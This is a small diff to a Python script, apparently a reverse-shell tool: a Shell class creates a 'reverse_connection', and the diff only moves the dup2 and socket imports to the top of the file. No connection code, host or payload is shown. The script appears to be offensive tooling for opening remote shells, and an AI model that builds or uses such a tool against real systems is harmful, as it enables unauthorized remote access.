@@ -1,6 +1,8 @@
 # !/usr/bin/env python3
 
 from subprocess import run
+from os import dup2
+import socket
 import os
 
 
@@ -65,9 +67,6 @@ class Shell:
 
 
 if __name__ == "__main__":
-    from os import dup2
-    import socket
-
     os.system('clear')
 
     reverse_connection = Shell(
